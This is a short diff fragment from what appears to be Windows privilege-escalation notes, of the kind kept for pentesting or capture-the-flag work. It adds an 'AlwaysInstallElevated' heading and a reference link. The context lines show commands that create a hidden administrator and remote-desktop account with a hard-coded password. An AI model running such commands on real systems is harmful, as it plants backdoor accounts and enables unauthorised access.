@@ -140,3 +140,6 @@ net user api Dork123! /add
 net localgroup Administrators api /add
 net localgroup 'Remote Desktop Users' api /add
 ```
+---
+# AlwaysInstallElevated
+- https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
